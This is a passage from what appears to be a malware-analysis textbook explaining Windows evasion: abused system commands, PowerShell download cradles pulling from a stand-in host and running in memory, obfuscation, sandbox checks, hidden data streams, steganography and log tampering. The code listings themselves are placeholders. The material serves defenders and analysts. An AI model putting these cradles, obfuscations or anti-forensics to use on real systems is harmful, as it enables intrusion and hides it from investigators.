    class="SANS_TheSansMonoCd_W5Regular_11">\Temp\RegScvs.exe</samp> | <samp class="SANS_Futura_Std_Book_11">Deletes
    files. Malware may use it to remove evidence, such as executables and temporary
    files, from the victim system.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ipconfig.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c ipconfig.exe</samp> | <samp
    class="SANS_Futura_Std_Book_11">Displays network configuration settings. Malware</samp>
    <samp class="SANS_Futura_Std_Book_11">could invoke it to retrieve the victim’s
    local IP</samp> <samp class="SANS_Futura_Std_Book_11">address or other network
    information.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">ping</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c ping 8.8.8.8</samp> | <samp class="SANS_Futura_Std_Book_11">Pings a remote
    server. Malware may use it to see whether the victim is connected to the internet
    (as a sandbox detection technique, for example) or to make an initial contact
    to its C2 server.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">sc</samp> | <samp class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe
    /c sc query</samp> | <samp class="SANS_Futura_Std_Book_11">Starts, stops, creates,
    modifies, or queries services on the system when coupled with the respective option
    (such as</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">query</samp><samp
    class="SANS_Futura_Std_Book_11">, shown here).</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">taskkill.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c taskkill.exe /f</samp> <samp
    class="SANS_TheSansMonoCd_W5Regular_11">/</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">IM</samp>
    <samp class="SANS_TheSansMonoCd_W5Regular_11">evil.exe</samp> | <samp class="SANS_Futura_Std_Book_11">Terminates
    processes. Malware may invoke it to kill either its own processes or analysis
    tools and endpoint defenses.</samp> |'
  prefs: []
  type: TYPE_TB
- en: '| <samp class="SANS_TheSansMonoCd_W5Regular_11">timeout.exe</samp> | <samp
    class="SANS_TheSansMonoCd_W5Regular_11">cmd.exe /c timeout /t 120 nobreak>nul</samp>
    | <samp class="SANS_Futura_Std_Book_11">Pauses execution in batch scripts. Malware
    may execute it to attempt to time out “dumb” malware analysis sandboxes.</samp>
    |'
  prefs: []
  type: TYPE_TB
- en: While this section only scratches the surface of the Windows command line, these
    are some of the ways malware can abuse the operating system’s various utilities
    and commands in Windows. Since *cmd.exe* is a legitimate Windows binary, some
    of these actions may go unnoticed by endpoint defenses and analysts, so it’s important
    to be aware of these techniques.
  prefs: []
  type: TYPE_NORMAL
- en: '#### <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">PowerShell</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: Leveraging PowerShell is one of the most prevalent living off the land techniques
    in use by modern threats. *PowerShell* is a framework built into Windows that
    can be used, by legitimate system users and malware alike, to perform nearly any
    administration or configuration task in Windows. PowerShell exposes many commands,
    called *cmdlets*, that give the framework its power (pun intended). PowerShell
    is built on the .NET platform, which provides Windows developers with many libraries
    for building new applications. PowerShell can be run interactively via its command
    line, but in the context of malware, it’s often executed as an automated script
    or one-line command via the Windows API (using <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcess</samp>,
    for example).
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Implementing Cradles</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'One of the most common applications of PowerShell in malware is a *cradle*,
    a command (usually a single line) that downloads additional malware or modules
    from a staging server, sometimes directly executing these files as well. Here’s
    one way in which malware might implement a cradle:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'Let’s break down this PowerShell command. First, it takes advantage of the
    <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-WebRequest</samp> cmdlet,
    which sends an HTTP or HTTPS request to a remote web server. This cmdlet accepts
    as input the web server address and directory path of the file that will be downloaded
    (*zzl2.cab*). Finally, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-OutFile</samp>
    flag denotes the directory path and filename with which to save the file. This
    malicious *zzl2.cab* file will be saved in the user’s profile directory (indicated
    by the environment variable <samp class="SANS_TheSansMonoCd_W5Regular_11">$ENV:UserProfile</samp>)
    as *crypt.dll*. Since PowerShell is built on .NET, it has direct access to and
    can take advantage of the many .NET methods and classes:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: In this command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">-exec</samp>
    flag tells PowerShell to bypass any execution policies in place that would prevent
    the command from executing. PowerShell execution policies are configured on Windows
    to prevent certain PowerShell actions but can sometimes be bypassed quite easily.
    <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp> is short for <samp class="SANS_TheSansMonoCd_W5Regular_11">Invoke-Expression</samp>,
    which will execute the string that precedes it as a command. The next part of
    the command, the <samp class="SANS_TheSansMonoCd_W5Regular_11">(New-Object Net.WebClient).DownloadString</samp>
    expression, creates a new .NET <samp class="SANS_TheSansMonoCd_W5Regular_11">WebClient</samp>
    object with the <samp class="SANS_TheSansMonoCd_W5Regular_11">DownloadString</samp>
    method, which is another way malware can send web requests to a remote web server
    and download a payload. This payload will be downloaded from *http://<wbr>www<wbr>.evil<wbr>.cn*
    and executed directly in memory. If you’re interested in learning more about PowerShell
    cradles, see [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/mgeeky<wbr>/3b11169ab77a7de354f4111aa2f0df38*](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38)
    and [*https://<wbr>gist<wbr>.github<wbr>.com<wbr>/HarmJ0y<wbr>/bb48307ffa663256e239*](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).
  prefs: []
  type: TYPE_NORMAL
- en: The problem with these PowerShell cradles is that they’re immediately identifiable
    as suspicious, so let’s look at how PowerShell commands can be obfuscated to circumvent
    endpoint defenses and inhibit investigation.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Obfuscating PowerShell</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'PowerShell is extremely syntax tolerant, meaning that threat actors have a
    lot of room to obscure commands, rearrange characters in the command, or even
    insert unnecessary characters to confuse analysts and detection tools. As you’ll
    see, there are a few common ways in which malware authors obfuscate PowerShell
    execution. Let’s use this command as a starting point:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: 'One simple obfuscation method is to insert <samp class="SANS_TheSansMonoCd_W5Regular_11">+</samp>
    characters into the command, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: 'Characters can be either upper- or lowercase, so the following is still a valid
    PowerShell command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: However, it’s a bit more difficult to read.
  prefs: []
  type: TYPE_NORMAL
- en: 'Characters can also be reordered, as in this example:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: The numbers in brackets represent the positions of the <samp class="SANS_TheSansMonoCd_W5Regular_11">X</samp>,
    <samp class="SANS_TheSansMonoCd_W5Regular_11">E</samp>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">I</samp>
    characters after the reordering occurs, so these characters essentially make up
    <samp class="SANS_TheSansMonoCd_W5Regular_11">IEX</samp>.
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, PowerShell allows Base64-encoded data, so it’s entirely possible to
    issue an encoded command such as this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: We’ll discuss Base64 encoding in [Chapter 16](chapter16.xhtml). For now, we’ll
    turn to one final PowerShell-related functionality that malware can leverage to
    its advantage.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Querying WMI</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: 'As you might recall from previous chapters, *Windows Management Instrumentation
    (WMI)* allows system administrators to manage data and automate operations in
    Windows. In Windows 7 and earlier versions, the *Windows* *Management Instrumentation
    Console (WMIC)* was used to invoke WMI, but this is now deprecated on modern versions.
    It’s much more common now to invoke WMI using PowerShell, which has several built-in
    component cmdlets to interact with WMI. One example is <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-CimInstance</samp>,
    a cmdlet that malware can also use to query WMI objects. To gather information
    on the system, such as whether it’s a virtual machine or a sandbox, malware could
    execute the following commands directly from PowerShell:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: 'These commands query WMI for the system’s processor, BIOS, and disk drive information.
    In the following output, you can see from my BIOS information that I am running
    VirtualBox:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: 'Other interesting objects to query are <samp class="SANS_TheSansMonoCd_W5Regular_11">ThermalZoneTemperature</samp>
    and <samp class="SANS_TheSansMonoCd_W5Regular_11">Win32_Fan</samp>, which will
    return the current CPU temperature and the fan speed, respectively:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: If these functions return an error or do not return any information, it could
    mean that they haven’t been implemented, meaning that the host is possibly a virtual
    machine.
  prefs: []
  type: TYPE_NORMAL
- en: 'WMI is an extensive topic, and there are other ways malware may invoke it (such
    as directly using WMI interfaces like <samp class="SANS_TheSansMonoCd_W5Regular_11">IwbemServices.ExecQuery</samp>),
    but these are beyond the scope of this book and won’t be discussed further. Instead,
    we’ll move on to one more living off the land and fileless technique: the use
    of dynamically compiled code.'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Dynamically Compiled
    Code</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: '*Dynamically compiled malicious code* is seeing increased usage in malware.
    Upon delivery to the victim, this code is compiled and executed from memory, which
    may help the attack fly under the radar of endpoint defenses. This technique is
    often accompanied by the use of a dropper component. The dropper may be delivered
    to the victim (embedded inside an email, for example), and once it executes on
    the victim system, it downloads the malicious code from a server on the internet.
    This malicious code is often encrypted or obfuscated. Once the payload successfully
    downloads onto the victim host, it is decrypted and then compiled in memory by
    an existing compiler on the victim system. Modern versions of Windows include
    several compilers by default; these include the .NET compilers *msbuild.exe* and
    *csc.exe*. [Figure 15-5](chapter15.xhtml#fig15-5) shows how this technique might
    look in action.'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-5.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-5: An attack involving
    dynamically compiled code</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: This attack starts with a PowerShell cradle that downloads uncompiled .NET code
    from a remote server, perhaps using one of the methods described earlier in this
    chapter. Then, the PowerShell script invokes *csc.exe* to compile and execute
    the .NET code in memory.
  prefs: []
  type: TYPE_NORMAL
- en: Another compiler is *msbuild.exe*. Microsoft Build Engine (*Msbuild*) is “a
    platform for building Windows applications” that accepts projects (*.proj*) or
    XML-based project files as input, compiles them, and executes them upon building.
    I won’t go into more detail on this technique, but you can read more about it
    in Tara Gould and Gage Mele’s article “Threat Actors Use MSBuild to Deliver RATs
    Filessly” at [*https://<wbr>www<wbr>.anomali<wbr>.com<wbr>/blog<wbr>/threat<wbr>-actors<wbr>-use<wbr>-msbuild<wbr>-to<wbr>-deliver<wbr>-rats<wbr>-filelessly*](https://www.anomali.com/blog/threat-actors-use-msbuild-to-deliver-rats-filelessly).
  prefs: []
  type: TYPE_NORMAL
- en: These techniques are especially interesting because they take advantage of multiple
    methods of defense evasion. First, these types of attacks can be almost completely
    fileless, as the downloaded code is compiled and executed only in memory. Second,
    they use LOLBins and compilers already available on the victim host, possibly
    allowing the attack to bypass controls such as AppLocker. Finally, when the malicious
    code downloads from the attacker’s server, it does so in an uncompiled state,
    so network defenses may not identify the code as malicious since they’re often
    tuned to look for compiled binaries. These are more examples of the many creative
    ways in which malware authors bypass and circumvent defenses.
  prefs: []
  type: TYPE_NORMAL
- en: Note that there are other methods of dynamic code compilation in Windows, such
    as using CGG/MinGW C compilers or *aspnet_compiler.exe* for compiling ASP.NET
    code. These compilers may be invoked from PowerShell, Command Prompt, or even
    Office documents with the help of VBA macro code.
  prefs: []
  type: TYPE_NORMAL
- en: In the final section of this chapter, we’ll explore a category of evasion techniques,
    called anti-forensics, that often go hand in hand with fileless attacks.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_B_11">Anti-forensics</samp>
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Imagine you’re an investigator recently assigned to a complex case of data theft.
    The victim organization determined that the incident occurred on a Windows server
    and was able to contain the attack by quarantining the server from the rest of
    the network, but not before the attacker made off with an unknown amount of potentially
    sensitive data. The strangest thing is that there are seemingly no breadcrumbs
    on the compromised server. No footprints to follow. No fingerprints or smudges
    left on the scene. All physical traces of malware have been removed from the hard
    disk. The system has been rebooted and there are no artifacts in memory to investigate.
    Some files on the disk even seem to have been encrypted, yet there is no demand
    for a ransom.
  prefs: []
  type: TYPE_NORMAL
- en: What you may be witnessing is anti-forensics in action. Let’s take a look at
    some creative anti-forensics techniques used by malware authors.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Hiding Artifacts and
    Code</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: Cyberattacks always leave some trace evidence on compromised systems or networks,
    no matter how skilled and creative the attacker is. Knowing this, evasive malware
    may go to great lengths to cover its tracks and remove as much forensic evidence
    as possible. This often involves hiding or removing artifacts that may give away
    the attack from infected systems.
  prefs: []
  type: TYPE_NORMAL
- en: One crude way in which malware can obscure evidence is by hiding important files
    and directories, such as its executable or configuration files. To do so, first
    the malware calls a function such as <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileAttributes</samp>
    on the relevant files, and then it applies the <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden</samp>
    attribute to them using the native Windows feature. This will effectively make
    the files invisible to some system users, but more experienced users and investigators
    will be able to easily circumvent this method.
  prefs: []
  type: TYPE_NORMAL
- en: '##### <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Removing and Corrupting
    Artifacts</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: 'Rather than simply hiding files, some malware attempts to delete or destroy
    evidence altogether. It can delete its own files in many ways, such as by calling
    the <samp class="SANS_TheSansMonoCd_W5Regular_11">DeleteFile</samp> WinAPI function
    or invoking PowerShell or the Windows command line. Depending on the method of
    deletion, however, a skilled investigator might still be able to recover the deleted
    artifacts. To address this gap, some malware has incorporated utilities specializing
    in secure, unrecoverable data destruction. Unit42 researchers reported that the
    threat actors behind the BlackCat ransomware used fileshredder, a tool designed
    for unrecoverable destruction of files, to securely delete evidence from the victim
    system (see “Threat Assessment: BlackCat Ransomware,” by Amanda Tanner, Alex Hinchliffe,
    and Doel Santos, at [*https://<wbr>unit42<wbr>.paloaltonetworks<wbr>.com<wbr>/blackcat<wbr>-ransomware<wbr>/*](https://unit42.paloaltonetworks.com/blackcat-ransomware/)).'
  prefs: []
  type: TYPE_NORMAL
- en: Additionally, since memory is one of the first places a skilled investigator
    hunts for malware, it’s wise for malware authors to clear their malware’s allotted
    memory. There are many ways of accomplishing this, such as by invoking the <samp
    class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp> function, which overwrites
    a memory region with zeros, effectively destroying any evidence that was there.
    Some ransomware malware families have even been known to call <samp class="SANS_TheSansMonoCd_W5Regular_11">RtlZeroMemory</samp>
    and similar functions to zero out their encryption keys in memory to decrease
    the chances of key recovery.
  prefs: []
  type: TYPE_NORMAL
- en: Instead of completely erasing memory, an attacker could alter it to remove or
    change code or data that would give away the malware’s presence. For example,
    the malware could simply remove the PE magic bytes <samp class="SANS_TheSansMonoCd_W5Regular_11">MZ</samp>
    from a memory region, causing some investigation tools that rely on this signature
    to fail. Or it could hide parts of its code or configuration in memory, such as
    by encoding or encrypting strings like command and control addresses. We’ll discuss
    code and data obfuscation and encryption in [Chapter 16](chapter16.xhtml), but
    many of the techniques that apply there could also be used as anti-forensics measures.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Abusing Alternate Data Streams</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: Another approach to hiding files is using NTFS Alternate Data Streams (ADS).
    Data contained in files in the Microsoft NTFS filesystem is usually located in
    a *primary data stream*. If you open a text file in a text editor, for example,
    the data displayed is part of the primary data stream. But data can also be hidden
    inside an ADS, in which case it won’t be readily apparent when an investigator
    inspects a file.
  prefs: []
  type: TYPE_NORMAL
- en: 'The best way to illustrate NTFS ADS is with an example. You can try this out
    yourself. First, create a text file with some dummy text and save the file as
    *file.txt*. To hide data in this file, run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: 'This command saves the text <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden
    text</samp> in the NTFS ADS <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp>.
    After running this command, if you open *file.txt* in a text editor, you won’t
    see the hidden text. To prove that the hidden text still exists, run the following
    command to print the primary data contained in the text file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, print out the text in the <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp>
    ADS like so:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: 'The output for the second command should be the data contained in the ADS.
    More practically, malware can hide code or a file, such as an executable, inside
    an ADS in a similar fashion. For example, the following command writes the malicious
    executable *evil.exe* to the file *invoice.doc* inside the data stream <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp>:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: Using this command, I wrote an executable file of about 760KB to the file *invoice.doc*,
    as shown in [Figure 15-6](chapter15.xhtml#fig15-6).
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-6.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-6: Hiding an executable
    file in an ADS</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: Viewing the document file’s metadata reveals that the file size is 12KB (the
    primary data stream) but with a “size on disk” value of 776KB (the total size
    of the file after I copied the executable file into its ADS).
  prefs: []
  type: TYPE_NORMAL
- en: Viewing this file in a hex editor or PE viewer reveals no anomalies. Data stored
    in the <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp> data stream will
    be invisible to most file editors and investigation tools unless an investigator
    knows exactly what to look for. Streams (from the sysinternals suite) is a good
    tool for identifying ADS anomalies.
  prefs: []
  type: TYPE_NORMAL
- en: Using an NTFS ADS is only one mechanism for hiding malicious files and code
    from investigation. Another tactic is hiding code in the CLFS log subsystem, as
    shown by researchers at Mandiant (see the article “Too Log; Didn’t Read—Unknown
    Actor Using CLFS Log Files for Stealth” by Adrien Bataille and Blaine Stancill,
    at [*https://<wbr>www<wbr>.mandiant<wbr>.com<wbr>/resources<wbr>/blog<wbr>/unknown<wbr>-actor<wbr>-using<wbr>-clfs<wbr>-log<wbr>-files<wbr>-for<wbr>-stealth*](https://www.mandiant.com/resources/blog/unknown-actor-using-clfs-log-files-for-stealth)).
    These techniques can effectively hide evidence from scrutinizing users and can
    add time and effort to the incident response and forensics investigation processes,
    both of which are boons to malware authors.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Hiding Data with Steganography</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Steganography* is a technique for hiding data in ordinary file formats, such
    as image, video, and audio files. Modern evasive malware might use steganography
    to circumvent endpoint and network defenses, as it effectively hides or obfuscates
    malicious code within seemingly innocent files, but this technique also fits quite
    nicely into the category of anti-forensics.'
  prefs: []
  type: TYPE_NORMAL
- en: Early examples of malware that used steganography techniques include the Duqu
    malware family from 2011, which gathered information from victim systems and stored
    it in a JPEG image file, and the Zeus banking trojan from 2014, which hid C2 commands
    in images that it sent to victims. A more recent example is an attack discovered
    by ESET researchers and dubbed “Stegano,” which featured exploit code embedded
    in images on various websites. The malicious code may have gone undetected by
    network defenses due to the way it was hidden in the image data (see Daniel Goodin’s
    article “Millions Exposed to Malvertising That Hid Attack Code in Banner Pixels”
    at [*https://<wbr>arstechnica<wbr>.com<wbr>/information<wbr>-technology<wbr>/2016<wbr>/12<wbr>/millions<wbr>-exposed<wbr>-to<wbr>-malvertising<wbr>-that<wbr>-hid<wbr>-attack<wbr>-code<wbr>-in<wbr>-banner<wbr>-pixels<wbr>/*](https://arstechnica.com/information-technology/2016/12/millions-exposed-to-malvertising-that-hid-attack-code-in-banner-pixels/)).
  prefs: []
  type: TYPE_NORMAL
- en: Malware can leverage steganography for many reasons, such as to hide data and
    malicious code from investigators, to obfuscate C2 commands in transit, or to
    mask data that will be exfiltrated from the victim network. There are a few different
    ways in which it can do this, including file appending and bit manipulation. *File
    appending*, as its name implies, is simply adding one file to the end of another,
    in a sort of piggybacking manner. As an example, if I were investigating a JPEG
    file that I suspected has been tampered with, I might inspect the headers of the
    file in a hex editor (see [Figure 15-7](chapter15.xhtml#fig15-7)).
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-7.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-7: A JPEG file header</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: This header is standard for a JPEG (which is <samp class="SANS_TheSansMonoCd_W5Regular_11">JFIF</samp>
    in the figure) file type. Further analysis of the file data reveals the anomaly
    shown in [Figure 15-8](chapter15.xhtml#fig15-8).
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-8.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-8: A file header
    hidden inside the JPEG file</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: Notice the <samp class="SANS_TheSansMonoCd_W5Regular_11">PK</samp> in this figure.
    This is the standard header for a ZIP archive file, indicating that a ZIP file
    may have been appended to the JPEG image! To extract this file and examine its
    contents, we could take a few approaches. First, we could “carve” the embedded
    ZIP out of this image file using a hex editor. This involves simply copying the
    suspect data from the file and dumping it to a new file. An alternative and simpler
    approach is using the free Binwalk utility ([*https://<wbr>github<wbr>.com<wbr>/ReFirmLabs<wbr>/binwalk*](https://github.com/ReFirmLabs/binwalk)).
    Binwalk “walks” an input file, searching for signs of other embedded files, and
    can automatically carve out these files. [Figure 15-9](chapter15.xhtml#fig15-9)
    shows Binwalk being used to extract a hidden executable file (*surprise.exe*)
    from a ZIP container embedded in the JPEG image.
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-9.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-9: Carving out embedded
    files with Binwalk</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: '*You can find this malware sample in MalShare or VirusTotal with the following
    hash:*'
  prefs: []
  type: TYPE_NORMAL
- en: 'SHA256: 0cfcf571748f0d0c3bcedead2508f0bec329558c29017e7093a138853cc0e17e'
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: This is a rather simple example of steganography. Modern attacks, however, generally
    use more complex techniques, such as *bit manipulation*, or rearranging or modifying
    bits to evade detection. For example, the individual bits in an image file could
    be manipulated to covertly store malicious code without affecting the quality
    of the image. [Figure 15-10](chapter15.xhtml#fig15-10) shows an excerpt of the
    data from an unaltered image file, viewed in a hex editor.
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-10: A hex dump of
    the unaltered image</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: However, this image has now been deviously manipulated by a threat actor, as
    you can see in [Figure 15-11](chapter15.xhtml#fig15-11).
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-11: A hex dump of
    the altered image</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: 'The last (16th) byte of each row has been manipulated. If a malware sample
    were to load this image file for reading (using <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadFile</samp>,
    for example), it could specifically extract these suspect bytes from the image
    file, as the following pseudocode does:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: 'Once all bytes are stored in memory, they add up to the byte string <samp class="SANS_TheSansMonoCd_W5Regular_11">"89
    E9 8D 55 05 FF D0"</samp>. Converting this byte string to x86 code reveals the
    following assembly code, which is likely to be some sort of shellcode:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: 'Finally, the *least significant bit (LSB)* technique involves tampering with
    specific bits inside a file. To illustrate this steganography technique, let’s
    say an image file has the following set of 8 bytes, each representing a pixel
    in the image:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: 'In some image-encoding formats, such as bitmap (BMP), the LSB, or the last
    bit in each byte, can be modified without greatly affecting the image. So, if
    an attacker wanted to hide malicious code inside this image, they could tamper
    with the LSBs and form a new string of bits. Let’s imagine that an attacker modified
    a select few of the LSBs (shown in bold):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: 'If we combine all the LSBs into a new byte, we get this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: This byte in and of itself doesn’t mean much to us. However, if the attacker
    were able to modify large amounts of LSBs in an image, they could effectively
    hide malicious code or data inside this image. Malware could hold pieces of its
    malicious code or configuration inside an image, using the LSBs as temporary storage.
  prefs: []
  type: TYPE_NORMAL
- en: As a final note, there are many open source and publicly available toolkits,
    such as Steghide ([*https://<wbr>steghide<wbr>.sourceforge<wbr>.net<wbr>/documentation<wbr>.php*](https://steghide.sourceforge.net/documentation.php)),
    for easy implementation of steganography techniques. It’s worth looking into these
    tools to better understand how steganography works and how it can be abused by
    malware authors to hide malicious code and data.
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Tampering with Logs
    and Evidence</samp>
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'During an investigation, logs and other metadata can serve as valuable evidence
    that a specific malicious event did or did not occur, so altering or removing
    them will hamper the detection, response, and analysis process. For this reason,
    logs and related metadata can be prime targets for evasive malware that seeks
    to hide its activities from investigators. In this section, we’ll look at two
    tampering techniques: log tampering and timestomping.'
  prefs: []
  type: TYPE_NORMAL
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Event Log Tampering</samp>
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
- en: '*Log tampering* involves altering or deleting entries from logs on the host
    that may give away the malware’s presence. One type of log source that an attacker
    might tamper with is *Windows event logs*, which contain information about various
    Windows and application events and are thus great sources of data for investigators.
    [Figure 15-12](chapter15.xhtml#fig15-12) shows the Windows Event Viewer, a built-in
    Windows utility for exploring event logs.'
  prefs: []
  type: TYPE_NORMAL
- en: '![](../images/fig15-12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-12: Viewing system
    event logs in the Windows Event Viewer</samp>'
  prefs: []
  type: TYPE_NORMAL
- en: 'Windows event logs have a common structure that includes the following information:'
  prefs: []
  type: TYPE_NORMAL
- en: An *event ID* denoting the type of event that occurred
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A *timestamp* indicating the date and time of that event
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The *source* of the event, such as the specific software or component that triggered
    it
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: A *description* of the event
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Additionally, each event has a level assigned to it:'
  prefs: []
  type: TYPE_NORMAL
- en: '*Informational*, for general messages such as information about a software
    package being installed or uninstalled'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*Warnings*, for events that could indicate an issue that should be addressed'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*Errors*, for events such as application crashes'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '*Critical*, for events that are detrimental to the functioning of the system'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Windows can capture many different event types. Three of the most common log
    types are *system* logs (for events related to the system and its components),
    *application* logs (for events related to Windows and third-party applications
